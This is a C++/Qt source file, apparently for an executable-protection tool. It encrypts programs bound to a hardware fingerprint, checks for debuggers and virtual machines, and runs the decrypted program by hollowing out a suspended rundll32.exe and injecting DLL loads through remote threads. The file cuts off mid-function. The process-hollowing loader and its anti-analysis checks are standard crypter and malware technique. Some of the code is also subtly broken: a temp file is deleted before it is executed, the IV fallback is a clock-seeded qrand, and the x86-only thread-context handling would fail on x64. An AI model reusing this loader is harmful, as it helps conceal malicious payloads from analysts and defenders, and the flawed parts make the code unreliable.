#include "runtimeprotector.h"
#include "hardwarefingerprint.h"
#include <QFile>
#include <QByteArray>
#include <QCryptographicHash>
#include <QProcess>
#include <QDebug>
#include <QTemporaryFile>
#include <QDir>
#include <QTime>
#include <QThread>
#include <QFileInfo>
#include <QDataStream>
#include <cstring>

// For Windows-specific functions
#ifdef Q_OS_WIN
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winnt.h>
#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#endif

// NTSTATUS for NtUnmapViewOfSection
typedef LONG NTSTATUS;
#define STATUS_SUCCESS 0
#endif

// File format header for protected executables:
// [MAGIC: 8 bytes] [FINGERPRINT_LEN: 4 bytes] [FINGERPRINT: variable] [ENCRYPTED_DATA: variable]
// Magic: "PHILPROT" (8 bytes)
// Fingerprint length: 4-byte integer (little-endian)
// Fingerprint: SHA-256 hex string (64 bytes)
// Encrypted data: IV (16 bytes) + AES-256-CBC encrypted executable

static const char MAGIC_HEADER[] = "PHILPROT";
static const int MAGIC_HEADER_SIZE = 8;
static const int FINGERPRINT_LENGTH_SIZE = 4;
static const int FINGERPRINT_SIZE = 64; // SHA-256 hex = 64 characters

QByteArray RuntimeProtector::deriveKey(const QString &hardwareKey)
{
    QCryptographicHash hash(QCryptographicHash::Sha256);
    hash.addData(hardwareKey.toUtf8());
    return hash.result(); // Returns 32 bytes (256 bits)
}

QByteArray RuntimeProtector::generateIV()
{
    QByteArray iv(16, 0);
    
#ifdef Q_OS_WIN
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        CryptGenRandom(hProv, 16, reinterpret_cast<BYTE*>(iv.data()));
        CryptReleaseContext(hProv, 0);
    } else {
        QTime time = QTime::currentTime();
        qsrand(static_cast<uint>(time.msec() + time.second() * 1000));
        for (int i = 0; i < 16; ++i) {
            iv[i] = static_cast<char>(qrand() % 256);
        }
    }
#else
    QTime time = QTime::currentTime();
    qsrand(static_cast<uint>(time.msec() + time.second() * 1000));
    for (int i = 0; i < 16; ++i) {
        iv[i] = static_cast<char>(qrand() % 256);
    }
#endif
    
    return iv;
}

QByteArray RuntimeProtector::encryptData(const QByteArray &data,
                                        const QByteArray &key,
                                        const QByteArray &iv)
{
#ifdef Q_OS_WIN
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        qDebug() << "CryptAcquireContext failed";
        return QByteArray();
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptCreateHash failed";
        return QByteArray();
    }
    
    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(key.data()), static_cast<DWORD>(key.size()), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptHashData failed";
        return QByteArray();
    }
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptDeriveKey failed";
        return QByteArray();
    }
    
    if (!CryptSetKeyParam(hKey, KP_IV, reinterpret_cast<const BYTE*>(iv.data()), 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptSetKeyParam failed";
        return QByteArray();
    }
    
    DWORD dataLen = static_cast<DWORD>(data.size());
    QByteArray encrypted(data.size() + 1024, 0);
    
    memcpy(encrypted.data(), data.data(), static_cast<size_t>(dataLen));
    
    DWORD bufferSize = static_cast<DWORD>(encrypted.capacity());
    if (!CryptEncrypt(hKey, 0, TRUE, 0, reinterpret_cast<BYTE*>(encrypted.data()), &dataLen, bufferSize)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptEncrypt failed";
        return QByteArray();
    }
    
    encrypted.resize(static_cast<int>(dataLen));
    
    QByteArray result = iv + encrypted;
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return result;
#else
    qDebug() << "AES encryption not available on this platform";
    return QByteArray();
#endif
}

QByteArray RuntimeProtector::decryptData(const QByteArray &encryptedData,
                                        const QByteArray &key)
{
    if (encryptedData.size() < 16) {
        qDebug() << "Encrypted data too small (missing IV)";
        return QByteArray();
    }
    
    QByteArray iv = encryptedData.left(16);
    QByteArray encryptedContent = encryptedData.mid(16);
    
#ifdef Q_OS_WIN
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    
    if (!CryptAcquireContext(&hProv, nullptr, nullptr, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        qDebug() << "CryptAcquireContext failed";
        return QByteArray();
    }
    
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptCreateHash failed";
        return QByteArray();
    }
    
    if (!CryptHashData(hHash, reinterpret_cast<const BYTE*>(key.data()), static_cast<DWORD>(key.size()), 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptHashData failed";
        return QByteArray();
    }
    
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, CRYPT_EXPORTABLE, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptDeriveKey failed";
        return QByteArray();
    }
    
    if (!CryptSetKeyParam(hKey, KP_IV, reinterpret_cast<const BYTE*>(iv.data()), 0)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptSetKeyParam failed";
        return QByteArray();
    }
    
    DWORD encryptedLen = static_cast<DWORD>(encryptedContent.size());
    QByteArray decrypted(encryptedContent);
    
    if (!CryptDecrypt(hKey, 0, TRUE, 0, reinterpret_cast<BYTE*>(decrypted.data()), &encryptedLen)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        qDebug() << "CryptDecrypt failed";
        return QByteArray();
    }
    
    decrypted.resize(static_cast<int>(encryptedLen));
    
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    
    return decrypted;
#else
    qDebug() << "AES decryption not available on this platform";
    return QByteArray();
#endif
}

QByteArray RuntimeProtector::embedFingerprintHeader(const QByteArray &encryptedData,
                                                    const QString &hardwareKey)
{
    QByteArray header;
    QDataStream stream(&header, QIODevice::WriteOnly);
    stream.setByteOrder(QDataStream::LittleEndian);
    
    // Write magic header
    stream.writeRawData(MAGIC_HEADER, MAGIC_HEADER_SIZE);
    
    // Write fingerprint length
    quint32 fingerprintLen = static_cast<quint32>(hardwareKey.length());
    stream << fingerprintLen;
    
    // Write fingerprint
    stream.writeRawData(hardwareKey.toUtf8().constData(), static_cast<int>(fingerprintLen));
    
    // Combine header + encrypted data
    return header + encryptedData;
}

QString RuntimeProtector::extractFingerprintHeader(const QByteArray &protectedData,
                                                   QByteArray &encryptedData)
{
    if (protectedData.size() < MAGIC_HEADER_SIZE + FINGERPRINT_LENGTH_SIZE) {
        qDebug() << "Protected data too small for header";
        return QString();
    }
    
    // Check magic header
    if (memcmp(protectedData.constData(), MAGIC_HEADER, MAGIC_HEADER_SIZE) != 0) {
        qDebug() << "Invalid magic header";
        return QString();
    }
    
    // Read fingerprint length
    QByteArray dataForStream = protectedData;
    QDataStream stream(&dataForStream, QIODevice::ReadOnly);
    stream.setByteOrder(QDataStream::LittleEndian);
    
    // Skip magic header
    stream.skipRawData(MAGIC_HEADER_SIZE);
    
    quint32 fingerprintLen;
    stream >> fingerprintLen;
    
    if (fingerprintLen == 0 || fingerprintLen > 256) { // Sanity check
        qDebug() << "Invalid fingerprint length:" << fingerprintLen;
        return QString();
    }
    
    int headerSize = MAGIC_HEADER_SIZE + FINGERPRINT_LENGTH_SIZE + static_cast<int>(fingerprintLen);
    if (protectedData.size() < headerSize) {
        qDebug() << "Protected data too small for complete header";
        return QString();
    }
    
    // Read fingerprint
    QByteArray fingerprintBytes(fingerprintLen, 0);
    stream.readRawData(fingerprintBytes.data(), static_cast<int>(fingerprintLen));
    QString fingerprint = QString::fromUtf8(fingerprintBytes);
    
    // Extract encrypted data (everything after header)
    encryptedData = protectedData.mid(headerSize);
    
    return fingerprint;
}

QByteArray RuntimeProtector::injectHardwareVerificationStub(const QByteArray &executableData,
                                                            const QString &hardwareKey)
{
    Q_UNUSED(hardwareKey);
    // Note: Full PE injection is complex and requires detailed PE parsing
    // For now, we'll rely on runtime verification before execution
    // The stub injection would modify the PE entry point to check hardware first
    // This is a placeholder - in production, you'd use a PE manipulation library
    
    qDebug() << "Hardware verification stub injection (placeholder)";
    qDebug() << "Runtime verification will be performed before execution";
    
    // Return original data - actual injection would require PE manipulation
    // For this implementation, we verify hardware at runtime before decrypting
    return executableData;
}

bool RuntimeProtector::isDebuggerPresent()
{
#ifdef Q_OS_WIN
    // Check multiple anti-debugging techniques
    if (::IsDebuggerPresent()) {
        return true;
    }
    
    // Check for remote debugger
    BOOL remoteDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDebugger);
    if (remoteDebugger) {
        return true;
    }
    
    // Additional checks using NtQueryInformationProcess (requires ntdll.dll)
    // For simplicity, we'll use the basic checks above
    // More advanced checks can be added if needed
    
    return false;
#else
    // For non-Windows, basic check
    return false;
#endif
}

bool RuntimeProtector::isVirtualMachine()
{
#ifdef Q_OS_WIN
    // Check for common VM artifacts
    HKEY hKey;
    LONG result;
    
    // Check VMware
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\vmware", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // Check VirtualBox
    result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    
    // Check for VM processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                QString processName = QString::fromWCharArray(pe32.szExeFile).toLower();
                if (processName.contains("vmware") || 
                    processName.contains("vbox") || 
                    processName.contains("vmtools") ||
                    processName.contains("vmwaretray") ||
                    processName.contains("vmwareuser")) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return false;
#else
    return false;
#endif
}

bool RuntimeProtector::performAntiDebuggingChecks()
{
    if (isDebuggerPresent()) {
        qDebug() << "Debugger detected!";
        return false;
    }
    
    // Optionally check for VM (you might want to allow VMs)
    // if (isVirtualMachine()) {
    //     qDebug() << "Virtual machine detected!";
    //     return false;
    // }
    
    return true;
}

bool RuntimeProtector::verifyHardwareFingerprint(const QString &embeddedFingerprint)
{
    QString currentFingerprint = HardwareFingerprint::generateHardwareKey();
    
    if (currentFingerprint.isEmpty()) {
        qDebug() << "Failed to generate current hardware fingerprint";
        return false;
    }
    
    bool matches = (currentFingerprint == embeddedFingerprint);
    
    if (!matches) {
        qDebug() << "Hardware fingerprint mismatch!";
        qDebug() << "Embedded:" << embeddedFingerprint.left(16) << "...";
        qDebug() << "Current:" << currentFingerprint.left(16) << "...";
    }
    
    return matches;
}

#ifdef Q_OS_WIN
// Forward declaration for fallback
static int executeFromMemoryFallback(const QByteArray &executableData, const QStringList &arguments);
static int executeFromMemoryFallbackRegular(const QByteArray &executableData, const QStringList &arguments);

int RuntimeProtector::executeFromMemory(const QByteArray &executableData,
                                       const QStringList &arguments)
{
    qDebug() << "=== IN-MEMORY PE EXECUTION (NO DISK WRITE) ===";
    
    if (static_cast<size_t>(executableData.size()) < sizeof(IMAGE_DOS_HEADER)) {
        qDebug() << "Executable data too small";
        return -1;
    }
    
    // Parse DOS header
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)executableData.data();
    if (dosHeader->e_magic != 0x5A4D) { // 'MZ'
        qDebug() << "Invalid DOS header";
        return -1;
    }
    
    // Parse NT headers - try 32-bit first
    if (static_cast<size_t>(executableData.size()) < dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32)) {
        qDebug() << "Executable data too small for NT headers";
        return -1;
    }
    
    PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(executableData.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != 0x00004550) { // 'PE\0\0'
        qDebug() << "Invalid PE signature";
        return -1;
    }
    
    // Check if 32-bit or 64-bit
    WORD magic = ntHeaders->OptionalHeader.Magic;
    if (magic != 0x10B) { // IMAGE_NT_OPTIONAL_HDR32_MAGIC
        if (magic == 0x20B) { // IMAGE_NT_OPTIONAL_HDR64_MAGIC
            qDebug() << "64-bit PE detected - using fallback method";
            return executeFromMemoryFallback(executableData, arguments);
        } else {
            qDebug() << "Unknown PE format, magic:" << QString::number(magic, 16);
            return executeFromMemoryFallback(executableData, arguments);
        }
    }
    
    DWORD imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    DWORD imageBase = ntHeaders->OptionalHeader.ImageBase;
    
    qDebug() << "Image size:" << imageSize << "bytes";
    qDebug() << "Preferred base:" << QString::number(imageBase, 16);
    
    // Allocate memory for the image
    LPVOID pImageBase = VirtualAlloc((LPVOID)(ULONG_PTR)imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        // Try allocating at any address if preferred base is not available
        pImageBase = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pImageBase) {
            qDebug() << "Failed to allocate memory for PE image";
            return -1;
        }
        qDebug() << "Allocated at alternative base:" << QString::number((ULONG_PTR)pImageBase, 16);
    } else {
        qDebug() << "Allocated at preferred base:" << QString::number((ULONG_PTR)pImageBase, 16);
    }
    
    // Copy headers
    memcpy(pImageBase, executableData.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS32));
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (sectionHeader[i].SizeOfRawData > 0) {
            void* pSection = (BYTE*)pImageBase + sectionHeader[i].VirtualAddress;
            void* pRawData = (BYTE*)executableData.data() + sectionHeader[i].PointerToRawData;
            memcpy(pSection, pRawData, sectionHeader[i].SizeOfRawData);
            qDebug() << "Copied section" << i << ":" << QString::fromLatin1((char*)sectionHeader[i].Name, 8).trimmed();
        }
    }
    
    // Process relocations if base address changed
    if ((ULONG_PTR)pImageBase != (ULONG_PTR)imageBase) {
        DWORD relocRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if (relocRVA > 0) {
            DWORD delta = (DWORD)((ULONG_PTR)pImageBase - (ULONG_PTR)imageBase);
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImageBase + relocRVA);
            
            while (pReloc->VirtualAddress > 0 && pReloc->SizeOfBlock > 0) {
                WORD* pRelocData = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                int numRelocs = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                
                for (int i = 0; i < numRelocs; i++) {
                    if ((pRelocData[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatch = (DWORD*)((BYTE*)pImageBase + pReloc->VirtualAddress + (pRelocData[i] & 0xFFF));
                        *pPatch += delta;
                    }
                }
                
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
            qDebug() << "Processed relocations";
        }
    }
    
    // Note: We don't resolve imports here because we'll write to a remote process
    // Imports will be resolved by the Windows loader in the target process
    // or we'll resolve them after writing to remote process
    
    // For true in-memory execution, we use process hollowing technique:
    // Create a suspended process, unmap its memory, inject our PE, and redirect execution
    // This prevents ExitProcess from killing our process
    
    // Get path to a system executable to use as host (rundll32.exe is small and always available)
    char systemPath[MAX_PATH];
    GetSystemDirectoryA(systemPath, MAX_PATH);
    QString hostExe = QString("%1\\rundll32.exe").arg(systemPath);
    
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    
    // Create suspended process
    if (!CreateProcessA(hostExe.toLocal8Bit().constData(), NULL, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        qDebug() << "Failed to create suspended process, error:" << GetLastError();
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return executeFromMemoryFallback(executableData, arguments);
    }
    
    qDebug() << "Created suspended process, PID:" << pi.dwProcessId;
    
    // Get thread context to modify entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        qDebug() << "Failed to get thread context";
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return executeFromMemoryFallback(executableData, arguments);
    }
    
    // Read PEB to get original image base (Ebx for x86, Rdx for x64)
    DWORD pebAddress = ctx.Ebx; // x86
    DWORD originalImageBase;
    SIZE_T bytesRead;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(pebAddress + 8), &originalImageBase, sizeof(DWORD), &bytesRead);
    
    // Unmap original image using NtUnmapViewOfSection
    typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = NULL;
    if (hNtdll) {
        NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (NtUnmapViewOfSection) {
            NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)originalImageBase);
            if (status != STATUS_SUCCESS) {
                qDebug() << "NtUnmapViewOfSection returned:" << status;
            }
        }
    }
    
    // Allocate memory in target process at preferred base
    LPVOID pRemoteImageBase = VirtualAllocEx(pi.hProcess, (LPVOID)(ULONG_PTR)imageBase, 
                                            imageSize, MEM_COMMIT | MEM_RESERVE, 
                                            PAGE_EXECUTE_READWRITE);
    DWORD delta = 0;
    if (!pRemoteImageBase) {
        // Try any address
        pRemoteImageBase = VirtualAllocEx(pi.hProcess, NULL, imageSize, 
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemoteImageBase) {
            qDebug() << "Failed to allocate memory in target process";
            TerminateProcess(pi.hProcess, 1);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            VirtualFree(pImageBase, 0, MEM_RELEASE);
            return executeFromMemoryFallback(executableData, arguments);
        }
        // Process relocations for new base
        delta = (DWORD)((ULONG_PTR)pRemoteImageBase - (ULONG_PTR)imageBase);
        DWORD relocRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
        if (relocRVA > 0 && delta != 0) {
            PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImageBase + relocRVA);
            while (pReloc->VirtualAddress > 0 && pReloc->SizeOfBlock > 0) {
                WORD* pRelocData = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));
                int numRelocs = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                for (int i = 0; i < numRelocs; i++) {
                    if ((pRelocData[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* pPatch = (DWORD*)((BYTE*)pImageBase + pReloc->VirtualAddress + (pRelocData[i] & 0xFFF));
                        *pPatch += delta;
                    }
                }
                pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
            }
        }
    }
    
    qDebug() << "Allocated memory in target process at:" << QString::number((ULONG_PTR)pRemoteImageBase, 16);
    
    // Write PE image to target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteImageBase, pImageBase, imageSize, &bytesWritten)) {
        qDebug() << "Failed to write PE to target process, error:" << GetLastError();
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return executeFromMemoryFallback(executableData, arguments);
    }
    qDebug() << "Written" << bytesWritten << "bytes to target process";
    
    // Resolve imports in remote process - this is critical for the PE to run
    // We need to load DLLs and resolve function addresses in the target process
    DWORD importRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    
    if (importRVA > 0) {
        // Get addresses of LoadLibraryA and GetProcAddress (same in all processes)
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");
        
        // Read import descriptors from our local copy
        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pImageBase + importRVA);
        
        while (pImportDesc->Name != 0) {
            char* dllName = (char*)((BYTE*)pImageBase + pImportDesc->Name);
            qDebug() << "Loading DLL in remote process:" << dllName;
            
            // Allocate memory in remote process for DLL name
            SIZE_T dllNameLen = strlen(dllName) + 1;
            LPVOID pRemoteDllName = VirtualAllocEx(pi.hProcess, NULL, dllNameLen, 
                                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!pRemoteDllName) {
                qDebug() << "Failed to allocate memory for DLL name";
                pImportDesc++;
                continue;
            }
            
            // Write DLL name to remote process
            SIZE_T bytesWritten2;
            WriteProcessMemory(pi.hProcess, pRemoteDllName, dllName, dllNameLen, &bytesWritten2);
            
            // Create remote thread to load DLL
            HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
                                               (LPTHREAD_START_ROUTINE)pLoadLibraryA,
                                               pRemoteDllName, 0, NULL);
            if (hThread) {
                WaitForSingleObject(hThread, INFINITE);
                DWORD hModule;
                GetExitCodeThread(hThread, &hModule);
                CloseHandle(hThread);
                
                if (hModule) {
                    qDebug() << "Loaded" << dllName << "at base" << QString::number(hModule, 16);
                    
                    // Resolve function addresses
                    DWORD* pThunk = (DWORD*)((BYTE*)pImageBase + pImportDesc->FirstThunk);
                    DWORD* pOrigThunk = pImportDesc->OriginalFirstThunk ? 
                        (DWORD*)((BYTE*)pImageBase + pImportDesc->OriginalFirstThunk) : pThunk;
                    
                    while (*pOrigThunk) {
                        DWORD funcAddr = 0;
                        
                        if (*pOrigThunk & 0x80000000) {
                            // Import by ordinal
                            WORD ordinal = *pOrigThunk & 0xFFFF;
                            FARPROC pFunc = GetProcAddress((HMODULE)hModule, (LPCSTR)(ULONG_PTR)ordinal);
                            funcAddr = (DWORD)(ULONG_PTR)pFunc;
                        } else {
                            // Import by name
                            PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pImageBase + *pOrigThunk);
                            FARPROC pFunc = GetProcAddress((HMODULE)hModule, (LPCSTR)pImportByName->Name);
                            funcAddr = (DWORD)(ULONG_PTR)pFunc;
                        }
                        
                        if (funcAddr) {
                            // Write function address to import thunk in remote process
                            DWORD remoteThunkAddr = (DWORD)((ULONG_PTR)pRemoteImageBase + pImportDesc->FirstThunk + 
                                                           ((pThunk - (DWORD*)((BYTE*)pImageBase + pImportDesc->FirstThunk)) * sizeof(DWORD)));
                            WriteProcessMemory(pi.hProcess, (LPVOID)remoteThunkAddr, &funcAddr, sizeof(DWORD), &bytesWritten2);
                        } else {
                            qDebug() << "Warning: Failed to resolve function from" << dllName;
                        }
                        
                        pThunk++;
                        pOrigThunk++;
                    }
                } else {
                    qDebug() << "Warning: Failed to load" << dllName << "in remote process";
                }
            }
            
            VirtualFreeEx(pi.hProcess, pRemoteDllName, 0, MEM_RELEASE);
            pImportDesc++;
        }
        qDebug() << "Completed import resolution in remote process";
    }
    
    // Update PEB image base
    WriteProcessMemory(pi.hProcess, (LPVOID)(pebAddress + 8), &pRemoteImageBase, sizeof(DWORD), &bytesWritten);
    
    // Set entry point in context (Eax for x86)
    DWORD entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD newEntryPoint = (DWORD)((ULONG_PTR)pRemoteImageBase + entryPoint);
    ctx.Eax = newEntryPoint;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        qDebug() << "Failed to set thread context, error:" << GetLastError();
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return executeFromMemoryFallback(executableData, arguments);
    }
    
    // Change memory protection in target process
    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess, pRemoteImageBase, imageSize, PAGE_EXECUTE_READ, &oldProtect)) {
        qDebug() << "Warning: Failed to change memory protection, error:" << GetLastError();
    }
    
    // Clean up local memory
    VirtualFree(pImageBase, 0, MEM_RELEASE);
    
    // Resume thread - this will execute our PE in the separate process
    qDebug() << "Resuming thread to execute PE at:" << QString::number(newEntryPoint, 16);
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        qDebug() << "Failed to resume thread, error:" << GetLastError();
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return -1;
    }
    
    // Wait for process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    // Get exit code
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    qDebug() << "Process exited with code:" << exitCode;
    qDebug() << "=== IN-MEMORY EXECUTION COMPLETE (NO DISK WRITE) ===";
    return (int)exitCode;
}

// Fallback method using temporary file with FILE_FLAG_DELETE_ON_CLOSE
// This creates a file but marks it for immediate deletion, making it effectively in-memory
static int executeFromMemoryFallback(const QByteArray &executableData,
                                     const QStringList &arguments)
{
    qDebug() << "=== USING SECURE TEMPORARY FILE METHOD ===";
    
    // Create temporary file with FILE_FLAG_DELETE_ON_CLOSE
    // This ensures the file is deleted as soon as the handle is closed
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char tempFile[MAX_PATH];
    GetTempFileNameA(tempPath, "rt", 0, tempFile);
    
    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, 
                              CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        qDebug() << "Failed to create temp file with DELETE_ON_CLOSE, error:" << GetLastError();
        // Fallback to regular temp file
        return executeFromMemoryFallbackRegular(executableData, arguments);
    }
    
    // Write executable data
    DWORD bytesWritten;
    if (!WriteFile(hFile, executableData.constData(), executableData.size(), &bytesWritten, NULL)) {
        qDebug() << "Failed to write to temp file, error:" << GetLastError();
        CloseHandle(hFile);
        return -1;
    }
    FlushFileBuffers(hFile);
    
    // Close file handle - file is marked for deletion but process can still access it
    CloseHandle(hFile);
    
    qDebug() << "Created temp file with DELETE_ON_CLOSE:" << tempFile;
    qDebug() << "File will be automatically deleted when process exits";
    
    // Small delay to ensure file is ready
    QThread::msleep(50);
    
    // Create process
    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);
    
    QString cmdLine = QString("\"%1\"").arg(QString::fromLocal8Bit(tempFile));
    if (!arguments.isEmpty()) {
        cmdLine += " " + arguments.join(" ");
    }
    
    QByteArray cmdLineBytes = cmdLine.toLocal8Bit();
    char* cmdLinePtr = cmdLineBytes.data();
    
    if (!CreateProcessA(NULL, cmdLinePtr, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        qDebug() << "Failed to create process, error:" << GetLastError();
        return -1;
    }
    
    qDebug() << "Started process, PID:" << pi.dwProcessId;
    
    // Wait for process to finish
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    qDebug() << "Process exited with code:" << exitCode;
    qDebug() << "=== EXECUTION COMPLETE ===";
    
    return (int)exitCode;
}

// Regular fallback if DELETE_ON_CLOSE fails
static int executeFromMemoryFallbackRegular(const QByteArray &executableData,
                                           const QStringList &arguments)
{
    qDebug() << "Using regular temporary file method";
    
    QString tempFilePath;
    {
        QTemporaryFile tempFile(QDir::tempPath() + QDir::separator() + "rt_prot_XXXXXX.exe");
        tempFile.setAutoRemove(true);
        
        if (!tempFile.open()) {
